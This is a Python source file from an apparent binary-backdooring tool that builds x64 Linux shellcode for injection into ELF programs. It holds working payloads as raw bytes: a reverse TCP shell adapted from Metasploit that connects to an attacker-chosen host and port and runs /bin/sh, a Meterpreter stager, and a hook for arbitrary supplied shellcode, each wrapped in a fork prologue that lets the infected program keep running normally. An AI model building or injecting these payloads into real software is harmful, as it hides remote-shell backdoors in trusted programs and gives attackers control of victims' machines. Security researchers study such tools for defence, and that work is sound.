'''

Copyright (c) 2013-2014, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct
import sys


class linux_elfI64_shellcode():
    """
    ELF Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            return False
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified from metasploit payload/linux/x64/shell_reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """

        if self.PORT is None:
            print ("Must provide port")
            return False

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
                            "\x48\x97\x48\xb9\x02\x00")
        self.shellcode1 += struct.pack("!H", self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89"
                            "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
                            "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
                            "\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
                            "\x0f\x05")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified from metasploit payload/linux/x64/shell/reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            return False

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
                            "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
                            "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00")
        self.shellcode1 += struct.pack("!H", self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
                            "\x05\x59\x5e\x5a\x0f\x05\xff\xe6")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        For user supplied shellcode
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)
